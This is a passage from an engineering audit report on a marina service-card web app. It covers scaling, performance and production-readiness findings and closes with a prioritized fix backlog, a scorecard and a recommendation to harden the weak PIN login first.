- **[High] No data layer → state and refetch explosion.** Each screen owns its own fetch/state (`CardsScreen`, `CustomerDetailScreen`, `BoatsScreen`, `CardDetailScreen`, …). There is no shared cache, so navigating Cards → Customer → Card → back refetches and re-joins everything. At 10x users this multiplies API load and screen latency, and every new feature re-implements loading/error/dirty logic. The god-file `CardDetailScreen.jsx` (2018 lines, 5 tabs, invoice math, OCR upload, checklist persistence, status rules) grows linearly with features and has no seams.
- **[High] No pagination + unbounded payloads.** `GET /api/cards` (`server.js:564-573`) returns **all** cards with 4-table joins and `ORDER BY updated_at`; `GET /api/boats` returns all boats plus every serial; `GET /api/customers` returns all customers. At 10x, the mobile client downloads and holds the entire dataset, `CardsScreen` filters it client-side in O(n) on every render (`CardsScreen.jsx:39-49`), and `/api/search` does unindexed `LIKE '%q%'` scans (`server.js:968-980`). Nothing scales past a few hundred rows.
- **[High] Photo storage and backup are single-node and in-memory.** Photos are written to a local disk directory and served by `express.static` (`server.js:21-24,222,228-235`) — no object storage, no CDN, no per-photo limits beyond 25 MB. `/api/export` builds the **entire DB dump as a string in memory** and then streams the whole photos directory through archiver (`server.js:1032-1062`); at 10x photos this OOMs the single Node process. `db/backup.js:28-58` likewise accumulates the full dump string in memory every boot day. `data/*.db-wal` already shows the DB growing; there is no storage tier.

### Medium
- **[Medium] God-files / no module boundaries.** `CardDetailScreen.jsx` 2018, `server.js` 1113, `ScanCardScanner.jsx` ~630, `AdminScreen.jsx` ~480. Server routing, migrations, seeding, backup, and business rules all live in one `server.js` closure; UI business rules live inside a single component. Any 10x team cannot work in parallel on these files.
- **[Medium] Client/server contract drift by duplication.** Category and option lists are duplicated in `constants.js` and `server.js` (`RECEIVED_ITEMS`, `CONDITIONS`, `SERIAL_TYPES`, cleaning items) — adding a type means editing two files and shipping both. The checklist `allDone` mismatch (A2) is exactly this drift already causing a bug.
- **[Medium] DB scaling gaps.** No indexes on hot FKs/filters and no pagination (A3); `attachSerials` (`server.js:392-402`) loads the whole `boat_serials` table per boats request; `GET /api/cards/:id` is N+1 on parts. MySQL pool is fixed at 10 (`db/mysql.js:49-50`) with no timeout/tuning.
- **[Medium] Unbounded `device_tokens` growth.** Every login inserts a row that is never expired or garbage-collected (`server.js:274`; no expiry column in `schema.sql:11-16`). At 10x sessions the table and the per-request `WHERE token = ?` lookup keep growing; there is no index guarantee beyond the PK, but cleanup never happens.
- **[Medium] No observability to scale with.** Only `console.error`/`console.log`; no request logging, metrics, or tracing (A8). You cannot see which endpoint or query blows up first at 10x.

### What to DELETE (not add)
- **Delete the SQLite adapter and its dialect-rewriting** (`db/sqlite.js`) once dev uses MySQL, or make it a real dialect layer. Today it exists only to keep MySQL-only backup/export code compiling (A3) and it lets engine drift hide.
- **Delete the inline migration/seed block** in `server.js:31-213` and replace with one versioned migration runner; it currently re-runs and swallows errors on every boot.
- **Delete the duplicated customer/boat creation flows** (one implementation, shared).
- **Delete dead deps** (`tailwindcss`, `autoprefixer`, `postcss`) and dead state (`showRawOcr`, `statusIdx`, `installPrompt`, `isPoppingRef`).
- **Delete git-tracked generated artifacts** (`.opencode/logs`, `data/*-wal`, `data/*-shm`).

**Running totals — Angle 6: Critical 0, High 3.**

### Cross-references
- Relates to Angle 1 (god-files, dead deps, migrations), Angle 3 (indexes/N+1/transactions), Angle 7 (renders/payloads), Angle 8 (observability/backups).

## Angle 7: Performance

### High
- **[High] First paint is blocked on a network round-trip.** `main.jsx:4-36` runs `checkVersion()` (a `fetch('/api/version')`) and only calls `root.render()` in its `.then`. If the server is slow, down, or the device is offline (a PWA use case), the fetch can hang until the browser timeout and the user sees a blank screen; there is no timeout, no cached-version fast path, and no error UI.
- **[High] Full-resolution photos are downloaded for tiny thumbnails.** `CardDetailScreen.jsx:801,1302` render `<img src={/photos/<file>}>` at 40x40/48x48 with no thumbnail variant, no `loading="lazy"`, and no `srcset`; `:1419` renders another list. A card with 10+ multi-megabyte camera photos (25 MB upload cap) downloads them all at full size just to paint 40px squares. Camera captures are stored unmodified at 1920x1080 (`ScanCardScanner.jsx:170,197`).

### Medium
- **[Medium] A refetch per keystroke.** `CardsScreen.jsx:30-37`, `CustomersScreen.jsx:16-24`, `BoatsScreen.jsx:25-33`, `ScanCardScanner.jsx:252-258` fetch inside a `useEffect` keyed on the search string with no debounce or AbortController. Typing "Sea Ray" issues 7 full `/api/cards` joins. (`ProductAutocomplete.jsx:52` does debounce correctly; the pattern just isn't applied elsewhere.)
- **[Medium] Mutations refetch the entire card.** `CardDetailScreen.jsx` calls `reload()` (full `GET /api/cards/:id`, which itself is N+1 on parts, A3) after nearly every toggle, note keystroke (`:1210-1219` posts on each keystroke), and save. On a card with many logs/photos this is repeated full-object fetches.
- **[Medium] Unmemoized per-render work on the biggest screens.** `CardDetailScreen.jsx:1799-1842` `getTabBadge` and `:1884-1905` `getStageStatus` run for every tab/stage on every render and `JSON.parse` checklist `items_json` each time; `:1752-1762` rebuilds `serviceItems`/`cleaningTemplates`/`authSet` (new identities passed to children) every render, forcing child re-renders. `CardsScreen.jsx:39-49,71-83` recomputes filters and per-status counts (re-scanning `allCards`) on every render.
- **[Medium] No list virtualization / all-at-once rendering.** Cards, customers, boats, and the photo/checklist lists render every row with inline styles; at 10x this janks low-end mobile. Tied to the no-pagination issue (A6).
- **[Medium] Render-blocking fonts + huge inline stylesheet.** `index.html:19-23` pulls three Google Font families via a render-blocking `<link>` (swap is set, so mitigated), and `index.html` carries 1092 lines of inline CSS in the document head, so none of it is cacheable separately from the HTML.
- **[Medium] Server-side repeated heavy queries.** `attachSerials` loads the full `boat_serials` table on every boats request (`server.js:392-402`); `GET /api/cards/:id` queries parts per log (`:589-591`); search uses `LIKE '%q%'` with no index (`:968-980`).

### Low / explicitly clean
- **Code-splitting is done correctly for the heavy libs:** `qr-code-styling` (`QrCode.jsx:10`) and `tesseract.js` (`ScanCardScanner.jsx:215`) are dynamically imported, so they are not in the initial bundle. The cost is deferred — but tesseract still downloads engine + language data at runtime and a fresh worker is created per OCR run (`ScanCardScanner.jsx:215-222`, A2), so the first/again scans are slow.
- No polling or `setInterval` loops exist (verified); no obvious render loops.
- No unkeyed large lists found.

**Running totals — Angle 7: Critical 0, High 2.**

### Cross-references
- Relates to Angle 3 (N+1/full-table queries) and Angle 6 (no pagination/state layer).
- Relates to Angle 2 (OCR worker lifecycle, per-keystroke saves).

## Angle 8: Release / Production Readiness

### High
- **[High] No tests, lint, typecheck, or CI exist.** `package.json:6-15` has only dev/build/start scripts; verified there are no `*.test/*.spec`, no eslint/prettier/vitest/jest config, no `.github/`, no `tsconfig`. The only automated guard is a clever build-time regex in `scripts/gen-version.js:18-43` that blocks `{flag && <JSX/>}` (the SQLite `0`-rendering class of bug) — a single, hand-rolled check standing in for a whole quality system. Nothing verifies the flows in A2.
- **[High] Production database has no schema bootstrap or migrations.** `db/mysql.js` never runs a schema and `db/schema.sql` is SQLite-only (A3). `README.md:29` claims the bootstrap creates tables, but `server.js:31-119` only runs `ALTER TABLE` (requires existing tables) and creates `boat_serials`. There is no migration version table, no down/rollback path. A new environment or a restore to an older schema will fail.
- **[High] Default admin is seeded with PIN `0000` and printed to logs.** `server.js:202-205` creates `Admin/0000` on an empty DB; `:1103` prints "Default admin PIN: 0000" at startup. If production DB is ever empty (fresh deploy/restore) this is an instant compromise, and it combines with the brute-force issue (A4).
- **[High] No monitoring, request logging, or error tracking.** Only `console.log`/`console.error` scattered around; no structured logs, no request logging, no metrics, no Sentry/APM. The generic error handler (`server.js:1085-1088`) logs the stack to stdout and returns a generic 500. `/_health/readiness` always returns `{status:'ok'}` even if the DB is unreachable (`:226`) — it is not a real readiness check, so an orchestrator would keep traffic on a broken instance.
- **[High] Backups are unverified and single-copy.** `db/backup.js` writes a MySQL-only `.sql` dump to a local `backup/` folder on the same host/disk as the app, only when today's file is missing (`:15-21`), non-transactionally (`:30-56`), with no rotation and no restore script/procedure. `/api/export` is a manual zip. There is no tested restore path, so "we have backups" is unproven.

### Medium
- **[Medium] Update flow is disruptive and can strand users.** On any version change `main.jsx:10-29` wipes all `marina_*` localStorage (logging everyone out), deletes caches, unregisters service workers, then reloads. If the reload fails offline, the user is left with a wiped session and the "Updating app..." overlay (`:12-14`). Every deploy forces a logout.
- **[Medium] Config is non-portable and under-documented.** `server.js:17-20` hardcodes production `DATA_DIR` to `/private/data`; `.env.example` documents only `DB_*` (plus stale `GEMINI_API_KEY`/`APP_URL`) and not `PORT`, `DATA_DIR`, or `SQLITE_PATH`. No `engines` field or `.nvmrc` pins Node, so hosts can drift.
- **[Medium] Error messaging is inconsistent.** Server: some routes return `e.message` (`server.js:470`), most return generic 500. Client: errors are frequently swallowed and rendered as "empty" (A5), so production failures are silent end-to-end.
- **[Medium] No browser/feature guards.** `ScanCardScanner` assumes `navigator.mediaDevices`/`getUserMedia` without checking (insecure-context or unsupported browsers throw a generic error), and there is no graceful degradation for geolocation. `dvh` units are used without fallback.
- **[Medium] No dependency/security maintenance path.** No `npm audit`/Dependabot step in a (nonexistent) CI; `package-lock.json` is present but nothing enforces fresh audits. Combined with the XSS surface (A4), stale deps are a standing risk.

### Low
- **[Low] Deployment is manual and undocumented beyond README.** GoDaddy pull→publish→restart is described, but there is no rollback procedure, no smoke-test checklist, and the "restart to apply schema" dependency (`README.md:11-19`) is fragile.
- **[Low] `process.exit(1)` when `dist/` is missing** (`server.js:217-219`) is correct but crashes hard with no retry.
- **[Low] SIGTERM handler closes DB + server** (`server.js:1105-1108`) — good; no SIGINT.
- **[Low] Stale/dead deploy config** (`.env.example` AI Studio block) misleads operators.

**Running totals — Angle 8: Critical 0, High 5.**

### Cross-references
- Test/lint gap is the meta-cause of A2's escapable regressions.
- Prod schema bootstrap relates to Angle 3 and the "what to DELETE" list in Angle 6.
- Default PIN + no monitoring relate to Angle 4.

## Final Rollup

**Findings tally:** Critical 5, High 30 (A1 0/2, A2 2/9, A3 0/2, A4 3/5, A5 0/2, A6 0/3, A7 0/2, A8 0/5).

### 1. Top 20 prioritized backlog
| # | Item | Sev | Angle | Why it matters | Effort |
|---|---|---|---|---|---|
| 1 | Add login rate limit + lockout; enforce non-trivial PINs; remove default `0000` | Critical | A4/A8 | 10k-request admin takeover; empty-DB auto-compromise | S |
| 2 | Whitelist upload MIME/extension; serve `/photos` non-executable (CSP/`Content-Disposition`) | Critical | A4 | Stored XSS → token theft → account takeover | S |
| 3 | Escape all values written into print windows (`document.write`) | Critical | A4/A2 | Stored XSS via product/invoice fields | S |
| 4 | Fix double `/api` prefix in customer & boat delete | Critical | A2 | Both deletes are 100% broken | XS |
| 5 | Stop overwriting invoices when the GET failed | Critical | A2 | Silent financial data loss | S |
| 6 | Per-route authorization: role + record ownership on logs/photos/cards reads & writes | High | A4 | Any user can read/mutate/delete anyone's data | M |
| 7 | Fix `toMysqlDateTime` (missing date/time separator) | High | A2/A3 | 500s or corrupted timestamps on every completion | XS |
| 8 | Delete `parts_used` (or cascade) before `work_logs` | High | A2 | Delete work entry 500s via FK violation | S |
| 9 | Real MySQL schema bootstrap + versioned migrations | High | A3/A8 | Deploys/restores to a fresh DB fail outright | M |
| 10 | Add tests for critical flows + lint/typecheck + CI | High | A8 | No safety net; regressions ship silently | L |
| 11 | Transactional, off-host, rotating, tested backups + restore runbook | High | A8/A3 | Current backups are torn, single-copy, unrestorable | M |
| 12 | Make `status`/`unwrap_done` editor-only server-side | High | A4 | Mechanics can drive workflow state | XS |
| 13 | Scanner: fix camera leak on unmount, cancel OCR, make create idempotent/atomic | High | A2 | Privacy leak + duplicate cards | M |
| 14 | Authenticate `/photos` | High | A4 | Unauthenticated access to customer photos | S |
| 15 | Add helmet + CSP + baseline rate limiting | High | A4 | Turns XSS from easy into hard | S |
| 16 | Untrack `.opencode/logs/*` and `data/*-wal/-shm` | High | A1/A4 | Committed session logs + PII-bearing WAL | XS |
| 17 | Global error/empty/retry states + error boundary | High | A5/A2 | Errors look like "no data"; infinite shimmer | M |
| 18 | Confirm/relabel hidden destructive cache-clear button | High | A5 | Accidental logout + cache wipe | XS |
| 19 | Thumbnail/lazy images; non-blocking first paint (version check timeout) | High | A7 | Full-res downloads for 40px; blank cold start | M |
| 20 | Add request logging + error tracking + real readiness check | High | A8 | Cannot operate or diagnose at scale | M |

### 2. Scorecard (0-10)
| Dimension | Score | One-line |
|---|---|---|
| Correctness | 3 | Core CRUD works; several always-broken actions and silent data loss |
| Security | 2 | Brute-forceable auth, 2 XSS classes, broad IDOR, no headers |
| Data integrity | 3 | No transactions, malformed timestamps, no migrations, no MySQL schema |
| UX | 5 | Clean visual language; error/empty conflation and native dialogs |
| Accessibility | 2 | Mouse/touch-only, unlabeled controls, no focus management |
| Performance | 5 | Fine at current scale; no pagination, thumbnails, or memoization |
| Architecture | 3 | God-files, no data/state layer, client/server duplication |
| Maintainability | 3 | Dead deps/state, duplicated logic, inline migrations |
| Testability | 1 | Zero tests/lint/typecheck/CI |
| Release readiness | 2 | No migrations, monitoring, or verified backups |

**Overall ≈ 2.9/10.**

### 3. Classification
**MVP** (functional, feature-rich internal tool) — **not Production Ready**. It is past prototype (real users, real data, deployment pipeline) but lacks the correctness, security, and operational guarantees required to call it production-ready.

### 4. Three systemic changes that prevent the most recurrence
1. **Establish reproducible schema + migrations for the real (MySQL) engine** and delete the leaky SQLite/dialect shim. Most A3/A8 pain (fresh-deploy failure, malformed dates, torn backups) traces to "schema is an afterthought."
2. **Move authorization, validation, and business rules to the API boundary** — per-route role + ownership checks, input validation, rate limiting, output escaping — instead of trusting UI components and duplicating the rules there. This collapses the A4 IDOR/XSS cluster and the A2 client/server contract drift.
3. **Add a quality gate: tests for login/card/scan/upload/delete flows, plus lint/typecheck + CI + monitored backups.** The absence of any safety net is why A2's regressions and the `0`-render bug recurred.

### 5. Single highest-risk issue to fix first
**The PIN authentication stack (`server.js:268-280`, `:237-239`, `:202-205`):** 4-digit, unsalted, unlimited-attempt, default-`0000` login. It is trivial to break, and it is the prerequisite for exploiting the upload/file XSS (A4) into full admin takeover. Rate-limit + lockout + stronger PINs + remove the seeded default before anything else.


